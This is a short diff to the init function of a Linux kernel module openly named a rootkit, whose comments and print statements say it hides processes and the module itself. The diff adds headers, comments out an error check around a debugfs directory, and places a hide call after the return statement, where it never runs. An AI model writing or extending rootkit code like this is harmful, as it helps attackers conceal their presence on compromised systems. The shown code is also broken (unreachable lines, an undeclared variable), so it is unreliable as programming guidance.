@@ -1,5 +1,6 @@
 #include "rootkit.h"
-
+#include <linux/module.h>
+#include <linux/kernel.h>
 /*by defult its load the module with all fetures running*/
 /*
 fetures such as:
@@ -12,13 +13,15 @@ fetures such as:
 
 static int __init start_rootkit(void)
 {
-    int ret;
+    int ret=0;
+    extern struct dentry *subdir;
     subdir = debugfs_create_dir("rootkit", NULL);
-    if (!file)
+    /*if (!file)
     {
         debugfs_remove_recursive(subdir);
         return -ENOENT;
-    }
+    }*/
+
     
 
 
@@ -54,6 +57,8 @@ static int __init start_rootkit(void)
     }
     printk(KERN_ALERT "rk: hide the proces!");
     return 0;
+    ret = start_hide;
+    printk("module hide");
 
 
 
